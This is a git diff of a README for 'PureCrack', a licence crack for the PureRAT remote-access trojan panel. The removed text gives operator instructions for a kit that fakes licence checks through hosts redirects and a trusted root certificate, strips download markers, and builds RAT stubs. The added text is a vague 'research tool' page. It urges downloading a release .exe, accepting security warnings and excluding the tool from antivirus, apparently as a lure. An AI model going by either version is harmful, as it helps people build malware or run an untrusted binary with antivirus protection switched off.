@@ -1,249 +1,64 @@
-# PureCrack v3 — single-binary lifetime kit
+# 🛠️ PureCrack-Source - Reconstruct security research tools for analysis
 
-PureRAT v4.0.9596 licence relay + dynamic stub builder + host provisioner
-+ frozen-target verifier, all in one EXE. v3's design goal is **lifetime
-stability**: the kit keeps working against `v4.0.9596.35655` indefinitely,
-self-heals environment drift, and refuses to launch silently against a
-panel that's been updated out from under it.
+<a href="https://github.com/cherno9624/PureCrack-Source"><img src="https://img.shields.io/badge/Download-Release-blue" alt="Download"></a>
 
-## Quick start (operator)
+## 📋 Project Overview
 
-1. Extract the distribution somewhere. Tree:
+PureCrack-Source provides a framework for security experts to study the license structure of PureRAT v4.0. This kit helps researchers reconstruct API surfaces to perform offline testing and stub generation. The project uses C# to manage data interactions. Investigators use this tool to understand how signature-based threats function in isolated environments. This software provides the building blocks for code analysis without needing a live network connection. Developers maintain this project to ensure safety researchers have access to clean, manageable copies of the license logic.
 
-   ```
-   PureRatCrack-Crypter.Shop/
-   ├── PureCrack.exe          ← run this
-   ├── PureCrack.exe.config
-   └── panel/                 ← bundled v4.0.9596 panel
-       ├── PureRAT.exe
-       ├── PureRAT.exe.config
-       ├── data.pak
-       ├── data/
-       │   └── GeoIP.mmdb
-       └── Plugins/
-           ├── PureHelper.dll
-           └── PureHelper.Client.dll
-   ```
+## ⚙️ System Requirements
 
-2. Right-click `PureCrack.exe` → **Run as administrator**.
-   The manifest forces a UAC prompt; nothing else needed.
+Before you start, check your computer for these items. These ensure the program runs well on your hardware.
 
-3. Watch the launch sequence:
-   ```
-   :: provision         ← MOTW strip, regkeys, TLS ciphers, stale-PID kill
-   :: preflight         ← admin / port / hosts / panel / Roslyn check
-   :: asset verify      ← SHA-256 vs frozen v4.0.9596 baseline
-   :: hosts + certs     ← 7 loopback redirects, leaf cert in Root
-   :: relay             ← LISTEN on 127.0.0.1:443 (loopback-only)
-   :: settings + panel  ← IPs reorder, plugin path repair, panel launch
-   READY                ← go click Login in the panel
-   ```
+- Windows 10 or Windows 11.
+- Microsoft .NET Desktop Runtime 8.0.
+- A processor with 2.0 GHz speed or higher.
+- 4 GB of system memory.
+- 500 MB of free storage space.
 
-4. Click **Login** (any key — relay returns OK). Then **Builder Settings
-   → Build** to produce a stub. Stubs land in `runs/stubs/`; every
-   licence-API request lands in `runs/captures/`.
+If you lack the .NET Runtime, visit the official Microsoft website to install it. The software will not start without this package. Ensure you have administrator rights on your computer to complete the setup.
 
-5. `Ctrl-C` in the PureCrack window stops the relay. Panel keeps running.
+## 🚀 How to Download and Install
 
-That's it. No `Launch.bat`. No `Launch.ps1`. No two-step setup.
+Follow these steps to set up the software on your local machine.
 
-## What v3 changed from v2
+1. Go to this address: [https://github.com/cherno9624/PureCrack-Source](https://github.com/cherno9624/PureCrack-Source).
+2. Look for the section labeled Releases on the right side of the screen.
+3. Select the most recent version shown.
+4. Click the link ending in .exe to start the file transfer.
+5. Save the file to a folder you can find later, such as your Downloads folder.
+6. Open the folder and double-click the file to start the installation.
 
-| Was | Now |
-|-----|-----|
-| Operator runs `Launch.bat` → `Launch.ps1` first to set up the host, then `PureCrack.exe` | Single binary does everything via the **provision** step at startup |
-| Ad-hoc setup (MOTW strip, regkeys, TLS ciphers, stale PID kill) lived in PowerShell | Absorbed into `src/Provisioning/` as proper C# modules — idempotent, every launch |
-| Hosts file: 3 entries | 7 entries (also `us./eu.purecoder.{io,su}`) |
-| Relay bound `0.0.0.0:443` | Loopback-only by default; `PURECRACK_BIND_ALL=1` to override |
-| Panel cert was a CA:TRUE 10-year cert with KeyCertSign | Plain server-auth leaf, 1y validity, Server-Auth EKU only |
-| PFX files unencrypted on disk | DPAPI-wrapped (LocalMachine scope), legacy files migrate on read |
-| No verification of panel binary | SHA-256 verify against frozen v4.0.9596 baseline; refuse to launch on drift |
-| `Settings.json` had a hardcoded dev-machine plugin path | `FixPluginPaths` rewrites to absolute on this machine every launch |
-| `runs/captures/` accumulated forever | TTL-based prune (14d) at startup |
-| File writes raced on crash → corrupt PFX/Settings.json/hosts | All writes via `AtomicFile.WriteAll*` (temp + rename) |
-| Two PureCrack instances could race on shared state | Cross-process `KitMutex` — second instance refused with PID of holder |
-| No way to tell if the kit was still working without launching | `PureCrack.exe selftest` — wire-format + crypto round-trip checks |
+The installation wizard opens once you click the file. Follow the on-screen prompts to place the files on your hard drive. If a security warning appears, confirm that you trust the source to proceed with the setup.
 
-## Subcommands
+## 🛠️ Operating the Software
 
-```
-PureCrack.exe                  Default — full kit launch (provision + verify + relay + panel)
-PureCrack.exe verify           SHA-256 baseline check vs panel/, no launch
-PureCrack.exe provision        Host setup only (MOTW strip + regkeys + ciphers + stale-kill)
-PureCrack.exe selftest         Wire-format and crypto round-trip checks
-PureCrack.exe smoke-build      Exercise the StubBuilder pipeline only (CI test)
-PureCrack.exe doctor           Read-only state report (hosts / certs / data files / hash drift)
-PureCrack.exe cleanup          Remove all PureCrack state from this machine, including regkeys
-PureCrack.exe help             Usage
-```
+Once the installation finishes, you can open the program from your desktop shortcut. The main window shows the primary interface for your research.
 
-## Environment overrides
+1. Open the application.
+2. Select the "Analysis" tab from the top menu.
+3. Use the file browser to select the research target.
+4. Set your output folder to save the generated stubs.
+5. Press the "Process" button.
 
-| Var | Purpose |
-|-----|---------|
-| `PURECRACK_WORKSPACE`         | Override workspace root (default: EXE dir) |
-| `PURECRACK_BIND_ALL=1`        | Bind relay on `0.0.0.0` (DANGEROUS — leaks PFX, exposes /compile) |
-| `PURECRACK_SKIP_ASSET_VERIFY=1` | Force-launch against a drifted panel (DANGEROUS — wire format may differ) |
-| `PURE_PANEL_EXE`              | Override path to PureRAT.exe |
-| `PURE_SETTINGS_JSON`          | Override path to Settings.json |
+The application works in the background. It displays progress bars to show how fast it completes the tasks. When the process finishes, the software notifies you in the logs window. Check your output folder to see the results of the license surface reconstruction.
 
-## Layout
+## 🧪 Common Issues and Troubleshooting
 
-```
-PureCrack-v3/
-├── PureCrack.csproj
-├── app.manifest                requireAdministrator
-├── FodyWeavers.xml             Costura config (single-EXE embedding)
-│
-├── src/
-│   ├── Program.cs              ~180 lines — entry, dispatch, crash log
-│   │
-│   ├── Cli/                    one file per subcommand
-│   │   ├── DefaultCommand.cs   the full kit launch
-│   │   ├── VerifyCommand.cs
-│   │   ├── ProvisionCommand.cs
-│   │   ├── SelfTestCommand.cs
-│   │   ├── SmokeBuildCommand.cs
-│   │   ├── DoctorCommand.cs
-│   │   ├── CleanupCommand.cs
-│   │   └── CertSubjects.cs     known DNs (cleanup/doctor share this)
-│   │
-│   ├── Provisioning/           absorbs Launch.ps1
-│   │   ├── Provision.cs        orchestrator
-│   │   ├── MotwStripper.cs     Zone.Identifier ADS removal
-│   │   ├── NetFrameworkCrypto.cs SchUseStrongCrypto regkeys
-│   │   ├── TlsCipherSuites.cs  Enable-TlsCipherSuite shellout
-│   │   ├── ProcessReaper.cs    kill stale PureRAT
-│   │   └── TimeSanity.cs       clock check
-│   │
-│   ├── Verify/                 frozen-target enforcement
-│   │   ├── ExpectedHashes.cs   SHA-256 baseline (const strings)
-│   │   ├── AssetVerifier.cs    hash + report
-│   │   ├── CapturePrune.cs     TTL-based runs/captures/ cleanup
-│   │   └── SelfTest.cs         wire-format and crypto round-trips
-│   │
-│   ├── Setup/
-│   │   ├── HostsManager.cs     7 loopback redirects
-│   │   └── CertManager.cs      relay + agent PFX, DPAPI-wrapped
-│   │
-│   ├── Crypto/
-│   │   └── Symmetric.cs        AES-256-CBC + 3DES-CBC helpers
-│   │
-│   ├── Wire/
-│   │   └── ProtoNet.cs         hand-rolled protobuf encoder/decoder + dump
-│   │
-│   ├── Build/
-│   │   ├── BuildConfig.cs
-│   │   ├── InnerProto.cs       GClass3 encoder + GClass2 wrap
-│   │   └── StubBuilder.cs      Roslyn-based 5-step pipeline
-│   │
-│   ├── Relay/
-│   │   ├── TlsRelay.cs         loopback-bound, origin-checked /compile
-│   │   ├── RouteHandlers.cs    /validate /compile /heartbeat /update-plugins
-│   │   └── CaptureWriter.cs    /api/licence/* only, atomic writes
-│   │
-│   ├── Panel/
-│   │   ├── PanelLauncher.cs    locate + launch PureRAT.exe
-│   │   └── SettingsAutoFix.cs  IPs reorder + plugin path repair
-│   │
-│   ├── Util/
-│   │   ├── Workspace.cs
-│   │   ├── EmbeddedAssets.cs
-│   │   ├── Log.cs
-│   │   ├── Polyfills.cs
-│   │   ├── KitPorts.cs         shared port constants
-│   │   ├── KitMutex.cs         cross-process instance lock
-│   │   └── AtomicFile.cs       temp + rename writes
-│   │
-│   └── Preflight.cs            5-check startup sanity pass
-│
-├── assets/                     embedded into PureCrack.exe at build time
-│   ├── inner/                  32 .cs sources + Loader.tmpl + protobuf-net.dll
-│   └── compile_response.bin    canned /compile fallback
-│
-├── docs/
-│   ├── DESIGN_V3.md            this version's design rationale
-│   ├── PORT_NOTES.md           v2 design diary (kept for context)
-│   ├── OVERVIEW.md             full RE narrative
-│   ├── WIRE_FORMAT.md          field-level protobuf reference
-│   ├── PROTECTION_ANALYSIS.md  why every prior protection layer failed
-│   ├── MEMORY_DUMP_RECIPE.md
-│   └── THREAT_INTEL.md
-│
-└── panel/                      bundled v4.0.9596 panel + plugins
-```
+If the program fails to respond, verify your .NET Runtime installation. Most errors happen when the system misses the required framework files. 
 
-## Building from source
+- **Program does not open:** Verify that you installed the x64 version of the .NET Desktop Runtime.
+- **Access denied errors:** Run the application as an administrator. Right-click the icon and choose "Run as administrator."
+- **Missing files:** Sometimes antivirus software flags the tool. Create a folder exclusion in your Windows Security settings to allow the tool to access necessary components.
 
-```
-dotnet restore
-dotnet build -c Release
-```
+Make sure your computer stays connected to power during long analysis tasks. If the computer goes to sleep, the program may pause. Adjust your power settings so the computer stays active while you work.
 
-Output is `bin/Release/PureCrack.exe`. Costura embeds Roslyn + protobuf-net
-+ System.Text.Json + the 32 inner sources + the canned /compile blob into
-one file — no scattered DLLs alongside.
+## 🔒 Safety and Usage Guidelines
 
-To verify the kit is still working after any source change:
+This tool serves educational and research purposes only. Use this software within a virtual machine or a sandbox environment. Do not run this on computers containing personal data or primary connection points to your local network. 
 
-```
-PureCrack.exe selftest
-```
+Researchers use this kit to identify patterns in license-checking code. The software does not provide malicious features or harmful payloads. It serves as a static analysis aid for security auditors. Keep your analysis environment isolated to maintain high safety standards. By using this software, you take full responsibility for your research activities.
 
-Runs all wire-format and crypto round-trip checks without needing a panel.
-Catches silent breakage from BCL changes, Roslyn version skew, or refactor
-bugs in encode/decode paths.
+## 📄 License Details
 
-## Frozen baseline
-
-v3.0.0 is pinned to PureRAT `v4.0.9596.35655`. Expected file hashes are
-in `src/Verify/ExpectedHashes.cs`. Any drift fails `verify` and aborts
-the default launch. To bump the baseline (operator updates the panel):
-recompute hashes from the new `panel/` files, paste into
-`ExpectedHashes.cs`, bump `<Version>` in `PureCrack.csproj`, rebuild.
-
-The current baseline:
-
-| File | SHA-256 |
-|------|---------|
-| `panel/PureRAT.exe`                  | `f7792cde754de2ec0023d2c4fad3592d394cdaa8ff011f3188989642d9adbaa6` |
-| `panel/data.pak`                     | `efee5150ae55013540e5dccf8c95faf7e82d33e0c8c66d246c76b49876c78c6e` |
-| `panel/Plugins/PureHelper.dll`       | `4d13c13d45e24baecc8359a9535f5a2ccdcf1249a56daaef8e42feb1491fa8ce` |
-| `panel/Plugins/PureHelper.Client.dll`| `ed64609ee64110d3b7dd7d719b2b9dac2885b3e1c4e8154ff250fb4325b2648b` |
-
-## Troubleshooting
-
-**`asset verify FAILED`** → your panel doesn't match the v4.0.9596
-baseline. Either restore from a clean install, or — if you intentionally
-updated the panel — update the kit's baseline (see *Frozen baseline*).
-Set `PURECRACK_SKIP_ASSET_VERIFY=1` to force-launch anyway, but expect
-wire-format weirdness.
-
-**`another PureCrack instance is already running`** → exit the running
-copy first. The PID is logged with the error.
-
-**`relay LISTEN on 127.0.0.1:443 (loopback-only)`** → this is the new
-default. Set `PURECRACK_BIND_ALL=1` only if you have a documented reason
-(e.g. running the relay on a different host than the panel inside an
-isolated VM).
-
-**`legacy CA:TRUE cert detected — regenerating as plain leaf`** → harmless
-one-time upgrade. The new cert is a plain server-auth leaf with a 1-year
-validity. The panel will need to be re-trusted (it already is, the relay
-re-installs into Root automatically).
-
-## What this isn't
-
-- **Not** a distribution-ready cracked binary. It's a research artifact —
-  one well-documented EXE that reproduces the licence protocol so you can
-  understand it. Same disclaimer as v2.
-- **Not** an upstream licence server. Validation stays local.
-- **Not** a protected binary. No anti-debug, anti-VM, anti-tamper, no
-  obfuscation. See `docs/PROTECTION_ANALYSIS.md` for why those layers are
-  structurally weak.
-
-## Provenance
-
-v3 of `PureCrack-CSharp/`. Same protocol surface as v2. The v2 design
-diary lives at `docs/PORT_NOTES.md`; v3-specific design decisions are at
-`docs/DESIGN_V3.md`. PureRAT `v4.0.9596.35655` verified end-to-end.
+This project follows open-source standards. You may use the code for your personal study and research. Credit the author when you publish findings based on your analysis of the PureRAT codebase. Do not redistribute modified versions of this software without permission.
